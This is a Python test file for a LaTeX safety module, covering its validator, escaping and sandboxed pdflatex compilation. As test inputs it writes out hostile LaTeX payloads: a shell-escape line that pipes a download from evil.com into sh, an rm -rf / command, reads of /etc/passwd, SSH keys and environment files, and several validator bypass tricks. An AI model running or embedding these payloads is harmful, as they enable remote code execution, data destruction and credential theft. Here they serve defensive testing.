"""Tests for LaTeX safety: validator, escaping, and sandboxed compilation."""
import subprocess
import tempfile
from pathlib import Path
from unittest import mock

import pytest

from src.utils.latex_safety import UnsafeLatexError, compile_tex, escape_latex, validate_tex_file


def _write_tex(content: str) -> str:
    """Write content to a temp .tex file, return path."""
    f = tempfile.NamedTemporaryFile(mode="w", suffix=".tex", delete=False)
    f.write(content)
    f.close()
    return f.name


def test_safe_tex_passes():
    path = _write_tex(r"""
\documentclass{article}
\begin{document}
Hello world
\end{document}
""")
    result = validate_tex_file(path)
    assert result["safe"]
    assert len(result["violations"]) == 0


def test_write18_blocked():
    path = _write_tex(r"\write18{curl evil.com | sh}")
    result = validate_tex_file(path)
    assert not result["safe"]
    assert any("shell escape" in v for v in result["violations"])


def test_immediate_write_blocked():
    path = _write_tex(r"\immediate\write18{rm -rf /}")
    result = validate_tex_file(path)
    assert not result["safe"]


def test_absolute_input_blocked():
    path = _write_tex(r"\input{/etc/passwd}")
    result = validate_tex_file(path)
    assert not result["safe"]


def test_openin_blocked():
    path = _write_tex(r"\openin\myfile=~/.ssh/id_rsa")
    result = validate_tex_file(path)
    assert not result["safe"]


def test_catcode_blocked():
    path = _write_tex(r"\catcode`\@=11")
    result = validate_tex_file(path)
    assert not result["safe"]


def test_relative_input_blocked():
    # Generated documents never need \input; relative paths can traverse upward
    path = _write_tex(r"\input{header.tex}")
    result = validate_tex_file(path)
    assert not result["safe"]


@pytest.mark.parametrize("payload", [
    r"\input{../../../../proc/self/environ}",
    r"\input /etc/passwd",
    r"\include{secrets}",
    r"\InputIfFileExists{x}{}{}",
    r"\lstinputlisting{/etc/passwd}",
    r"\read16 to \x",
    "\\csname in\nput\\endcsname{x}",
    r"^^5cinput{x}",
    r"\directlua{os.execute('id')}",
])
def test_bypass_payloads_blocked(payload):
    assert not validate_tex_file(_write_tex(payload))["safe"]


def test_includegraphics_allowed():
    path = _write_tex(r"\includegraphics[width=2cm]{professional_picture.png}")
    assert validate_tex_file(path)["safe"]


def test_missing_file():
    result = validate_tex_file("/nonexistent/file.tex")
    assert not result["safe"]


class TestEscapeLatex:
    def test_all_specials_escaped(self):
        assert escape_latex(r"R&D 100% $5 #1 a_b {x} ~ ^ \input") == (
            r"R\&D 100\% \$5 \#1 a\_b \{x\} \textasciitilde{} \textasciicircum{} "
            r"\textbackslash{}input"
        )

    def test_escaped_output_passes_validator(self):
        escaped = escape_latex(r"\input{/etc/passwd} \write18{id} ^^5c")
        assert validate_tex_file(_write_tex(escaped))["safe"]


class TestCompileTex:
    @pytest.fixture
    def tex(self, tmp_path):
        path = tmp_path / "cv.tex"
        path.write_text(r"\documentclass{article}\begin{document}Hi\end{document}")
        return path

    def _fake_pdflatex(self, tex):
        def run(cmd, **kwargs):
            tex.with_suffix(".pdf").write_bytes(b"%PDF")
            return subprocess.CompletedProcess(cmd, 0, "", "")
        return run

    def test_runs_sandboxed(self, tex, monkeypatch):
        monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-secret")
        with mock.patch("src.utils.latex_safety.shutil.which", return_value="/usr/bin/pdflatex"), \
             mock.patch("src.utils.latex_safety.subprocess.run", side_effect=self._fake_pdflatex(tex)) as run:
            assert compile_tex(tex) == tex.with_suffix(".pdf")

        cmd, kwargs = run.call_args.args[0], run.call_args.kwargs
        assert kwargs["cwd"] == tex.parent
        assert cmd[-1] == "cv.tex"  # bare name, so reads stay inside cwd
        assert "-no-shell-escape" in cmd
        assert kwargs["env"]["openin_any"] == "p"
        assert kwargs["env"]["openout_any"] == "p"
        assert "ANTHROPIC_API_KEY" not in kwargs["env"]

    def test_unsafe_source_never_compiled(self, tex):
        tex.write_text(r"\input{../../etc/passwd}")
        with mock.patch("src.utils.latex_safety.subprocess.run") as run:
            with pytest.raises(UnsafeLatexError):
                compile_tex(tex)
        run.assert_not_called()
